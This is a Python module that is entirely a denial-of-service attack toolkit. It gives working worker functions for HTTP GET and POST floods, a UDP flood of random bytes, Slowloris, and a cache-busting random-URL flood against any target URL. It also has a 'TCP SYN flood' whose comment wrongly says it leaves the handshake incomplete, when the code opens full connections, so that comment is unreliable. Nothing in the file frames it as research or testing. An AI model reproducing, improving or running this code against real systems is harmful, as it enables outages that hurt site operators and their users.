#!/usr/bin/env python3
"""
ATTACK METHODS MODULE
Various DDoS attack techniques
"""

import socket
import ssl
import random
import time
import requests
from urllib.parse import urlparse
from colorama import Fore, Style

class AttackMethods:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        
    def http_flood(self, duration=30, threads=100):
        """HTTP flood attack"""
        print(f"{Fore.CYAN}[*] Starting HTTP flood attack...")
        
        def flood_worker(worker_id):
            session = requests.Session()
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    session.get(self.target_url, timeout=2, verify=False)
                except:
                    pass
        
        return flood_worker
    
    def tcp_syn_flood(self, duration=30):
        """TCP SYN flood attack"""
        print(f"{Fore.CYAN}[*] Starting TCP SYN flood...")
        
        def syn_worker(worker_id):
            host = self.parsed_url.hostname
            port = self.parsed_url.port or 80
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((host, port))
                    
                    # Send SYN and don't complete handshake
                    sock.send(b'\x00' * 1024)
                    time.sleep(0.01)
                    sock.close()
                    
                except:
                    pass
        
        return syn_worker
    
    def udp_flood(self, duration=30):
        """UDP flood attack"""
        print(f"{Fore.CYAN}[*] Starting UDP flood...")
        
        def udp_worker(worker_id):
            host = self.parsed_url.hostname
            port = self.parsed_url.port or 80
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Send random UDP packets
                    data = random._urandom(1024)
                    sock.sendto(data, (host, port))
                    sock.close()
                    
                    time.sleep(0.001)
                    
                except:
                    pass
        
        return udp_worker
    
    def slowloris(self, sockets_count=200):
        """Slowloris attack"""
        print(f"{Fore.CYAN}[*] Starting Slowloris attack...")
        
        def slowloris_worker(worker_id):
            host = self.parsed_url.hostname
            port = self.parsed_url.port or 80
            
            sockets = []
            
            try:
                # Create multiple sockets
                for i in range(sockets_count // 100):  # Reduced count per worker
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(4)
                        sock.connect((host, port))
                        
                        # Send partial request
                        request = f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\n"
                        request += f"Host: {host}\r\n"
                        request += "User-Agent: Mozilla/5.0\r\n"
                        request += "Content-Length: 1000000\r\n"
                        request += "\r\n"
                        
                        sock.send(request.encode())
                        sockets.append(sock)
                        
                    except:
                        pass
                
                # Keep connections alive
                while True:
                    for sock in sockets:
                        try:
                            # Send keep-alive headers
                            sock.send(b"X-a: b\r\n")
                        except:
                            pass
                    
                    time.sleep(15)  # Send keep-alive every 15 seconds
                    
            except KeyboardInterrupt:
                pass
            finally:
                # Cleanup
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
        
        return slowloris_worker
    
    def post_flood(self, duration=30):
        """POST data flood"""
        print(f"{Fore.CYAN}[*] Starting POST data flood...")
        
        def post_worker(worker_id):
            session = requests.Session()
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Generate random POST data
                    data_size = random.randint(1024, 10240)  # 1KB to 10KB
                    data = {
                        'data': 'A' * data_size,
                        'timestamp': int(time.time()),
                        'random': random.randint(100000, 999999)
                    }
                    
                    session.post(
                        self.target_url,
                        data=data,
                        timeout=2,
                        verify=False
                    )
                    
                except:
                    pass
        
        return post_worker
    
    def recursive_get_flood(self, duration=30):
        """Recursive GET flood with random parameters"""
        print(f"{Fore.CYAN}[*] Starting recursive GET flood...")
        
        def recursive_worker(worker_id):
            session = requests.Session()
            end_time = time.time() + duration
            
            base_url = self.target_url
            if not base_url.endswith('/'):
                base_url += '/'
            
            while time.time() < end_time:
                try:
                    # Generate random URL with parameters
                    random_path = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                    random_param = f"?id={random.randint(1000, 9999)}&cache={random.random()}"
                    
                    target = f"{base_url}{random_path}{random_param}"
                    
                    session.get(target, timeout=2, verify=False)
                    
                except:
                    pass
        
        return recursive_worker
